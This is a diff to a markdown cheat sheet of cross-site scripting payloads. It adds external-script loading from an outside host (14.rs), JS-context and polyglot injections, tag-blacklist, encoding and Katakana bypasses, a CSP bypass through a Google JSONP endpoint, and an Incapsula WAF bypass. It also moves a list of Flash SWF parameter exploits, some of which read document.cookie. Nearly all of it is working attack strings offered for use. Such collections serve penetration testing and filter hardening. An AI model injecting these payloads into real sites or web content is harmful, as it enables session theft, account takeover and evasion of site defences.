@@ -71,6 +71,12 @@ XSS for HTML5
 <marquee onstart=alert(1)>
 ```
 
+XSS using script tag (external payload)
+```
+<script src=14.rs>
+you can alsoo specify an arbitratry payload with 14.rs/#payload
+e.g: 14.rs/#alert(document.domain)
+```
 
 XSS in META tag
 ```
@@ -83,25 +89,6 @@ With an additional URL
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
 ```
 
-XSS in flash application
-```
-flashmediaelement.swf?jsinitfunctio%gn=alert`1`
-flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
-ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
-swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
-swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
-plupload.flash.swf?%#target%g=alert&uid%g=XSS&
-moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
-video-js.swf?readyFunction=alert(1)
-player.swf?playerready=alert(document.cookie)
-player.swf?tracecall=alert(document.cookie)
-banner.swf?clickTAG=javascript:alert(1);//
-io.swf?yid=\"));}catch(e){alert(1);}//
-video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
-bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
-flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
-```
-
 XSS in Hidden input
 ```
 <input type="hidden" accesskey="X" onclick="alert(1)">
@@ -112,6 +99,20 @@ DOM XSS
 ```
 #"><img src=/ onerror=alert(2)>
 ```
+
+XSS in JS Context (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
+```
+-(confirm)(document.domain)//
+; alert(1);//
+```
+
+XSS URL
+```
+URL/<svg onload=alert(1)>
+URL/<script>alert('XSS');//
+URL/<input autofocus onfocus=alert(1)>
+```
+
 
 ## XSS in wrappers javascript and data URI
 XSS with javascript:
@@ -144,6 +145,7 @@ XSS with data:
 ```
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
 
 XSS with vbscript: only IE
@@ -151,7 +153,15 @@ XSS with vbscript: only IE
 vbscript:msgbox("XSS")
 ```
 ## XSS in files
-XSS in XML
+** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+```
+<name>
+  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+</name>
+```
+
+
+XSS in XML      
 ```
 <html>
 <head></head>
@@ -185,7 +195,7 @@ XSS in SVG (short)
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-XSS in SWF
+XSS in SWF flash application
 ```
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
@@ -198,8 +208,28 @@ open url to new window: InsecureFlashFile.swf?a=open&c=http://www.google.com/
 http request to url: InsecureFlashFile.swf?a=get&c=http://www.google.com/
 eval js codz: InsecureFlashFile.swf?a=eval&c=alert(document.domain)
 ```
-
 more payloads in ./files
+
+
+XSS in SWF flash application
+```
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+```
 
 
 
@@ -397,12 +427,34 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 ```
 
+Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
+![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)
+```
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+```
+![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)
+```
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+```
+
+
 
 ## Filter Bypass and exotic payloads
 
 Bypass case sensitive
 ```
 <sCrIpt>alert(1)</ScRipt>
+```
+
+Bypass tag blacklist
+```
+<script x>
+<script x>alert('XSS')<script y>
+```
+
+Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+```
+<img src='1' onerror='alert(0)' <
 ```
 
 Bypass quotes for string
@@ -459,10 +511,6 @@ Bypass space filter with "/" - IE/Firefox/Chrome/Safari
 <img/src='1'/onerror=alert(0)>
 ```
 
-Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
-```
-<img src='1' onerror='alert(0)' <
-```
 
 Bypass document blacklist
 ```
@@ -476,16 +524,23 @@ foo="text </script><script>alert(1)</script>";
 </script>
 ```
 
-Bypass using an alternate way to execute an alert
-```
-<script>window['alert'](0)</script>
-<script>parent['alert'](1)</script>
-<script>self['alert'](2)</script>
-<script>top['alert'](3)</script>
-<script>this['alert'](4)</script>
-<script>frames['alert'](5)</script>
-<script>content['alert'](6)</script>
 
+Bypass using an alternate way to execute an alert - [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)
+```
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
 ```
 
 Bypass using an alternate way to trigger an alert
@@ -532,6 +587,22 @@ Bypass ';' using another character
 'te' in alert('in') in 'xt';
 'te' instanceof alert('instanceof') instanceof 'xt';
 ```
+
+Bypass using HTML encoding
+```
+%26%2397;lert(1)
+```
+
+Bypass using Katakana (https://github.com/aemkei/katakana.js)
+```
+javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+```
+
+Bypass using Octal encoding
+```
+javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
+```
+
 
 Bypass using Unicode
 ```
@@ -609,6 +680,11 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
+Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))       
+//google.com/complete/search?client=chrome&jsonp=alert(1);
+```
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"   
+```
 
 Bypass using weird encoding or native interpretation to hide the payload (alert())
 ```javascript
@@ -618,9 +694,6 @@ Bypass using weird encoding or native interpretation to hide the payload (alert(
 <script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
 <script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
 ```
-
-
-
 
 Exotic payloads
 ```
@@ -637,6 +710,24 @@ Exotic payloads
 <iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
 ```
 
+## Incapsula WAF Bypass - 8th march
+```
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+```
+
+## More fun ?
+This section will be used for the "fun/interesting/useless" stuff.     
+
+Use notification box instead of an alert - by [@brutelogic](https://twitter.com/brutelogic)    
+Note : it requires user permission
+```
+Notification.requestPermission(x=>{new(Notification)(1)})
+
+Try here : https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermission(x=>%7Bnew(Notification)(1)%7D)//
+```
+
 
 ## Thanks to
 * https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
@@ -648,3 +739,5 @@ Exotic payloads
 * http://d3adend.org/xss/ghettoBypass
 * http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
 * http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html
+* https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5
+* https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
